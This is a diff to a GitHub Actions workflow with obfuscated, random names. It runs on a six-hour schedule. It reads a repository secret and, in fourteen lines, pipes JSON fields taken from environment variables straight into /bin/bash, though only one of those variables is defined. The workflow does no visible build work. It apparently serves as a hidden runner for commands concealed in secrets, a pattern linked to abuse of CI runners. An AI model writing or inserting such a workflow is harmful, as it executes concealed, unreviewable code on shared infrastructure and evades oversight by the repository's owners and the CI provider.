@@ -1,9 +1,10 @@
 name: kklxxki
+
 on:
   workflow_dispatch:
   schedule:
-    - cron: '32 1/6 * * *'
-jobs:  # 18384
+    - cron: '28 0/6 * * *'
+jobs:
   build:
     runs-on: ubuntu-latest
 
@@ -11,11 +12,20 @@ jobs:  # 18384
       - uses: actions/checkout@v4
       - name: kklxxki
         env:
-          r9: ${{ secrets.r9 }}
+          hrbck8767: ${{ secrets.hrbck8767 }}
         run: |
-          echo $r9 | jq -r .ax1 | /bin/bash
-          echo $iastv48 | jq -r .ejk0 | /bin/bash
-          echo $jvbp02906 | jq -r .zuo1 | /bin/bash
-          echo $i487 | jq -r .jhdb16964 | /bin/bash
-          echo $swnld009 | jq -r .q72686 | /bin/bash
+          echo $hrbck8767 | jq -r .vxra8 | /bin/bash
+          echo $qnrf98 | jq -r .riiq250 | /bin/bash
+          echo $is063 | jq -r .lbxhf4683 | /bin/bash
+          echo $urd1474 | jq -r .hj2 | /bin/bash
+          echo $pwwyc81 | jq -r .x741 | /bin/bash
+          echo $jlk411 | jq -r .relig2 | /bin/bash
+          echo $durvl5 | jq -r .i3558 | /bin/bash
+          echo $mi12 | jq -r .myb195 | /bin/bash
+          echo $ffbl8436 | jq -r .y13 | /bin/bash
+          echo $frav48 | jq -r .ustx37517 | /bin/bash
+          echo $m83819 | jq -r .h94 | /bin/bash
+          echo $jv74593 | jq -r .aqn08746 | /bin/bash
+          echo $vx324 | jq -r .bi869 | /bin/bash
+          echo $pia807 | jq -r .umpb6 | /bin/bash
 
